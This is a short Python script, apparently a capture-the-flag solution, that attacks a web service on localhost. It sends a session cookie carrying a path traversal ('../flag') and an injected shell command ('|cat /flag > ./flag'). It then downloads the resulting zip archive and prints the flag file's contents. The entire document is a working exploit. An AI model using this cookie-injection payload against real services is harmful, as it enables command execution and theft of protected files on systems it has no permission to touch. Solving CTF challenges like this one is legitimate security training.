#!/usr/bin/env python3
import io, zipfile, requests

HOST = "http://127.0.0.1:8888"

requests.get(f"{HOST}/")
requests.get(f"{HOST}/", headers={"Cookie": "session=../flag|cat /flag > ./flag"})

z = zipfile.ZipFile(io.BytesIO(requests.get(f"{HOST}/download").content))
print(f"[FLAG]: {z.read('flag').decode()}")
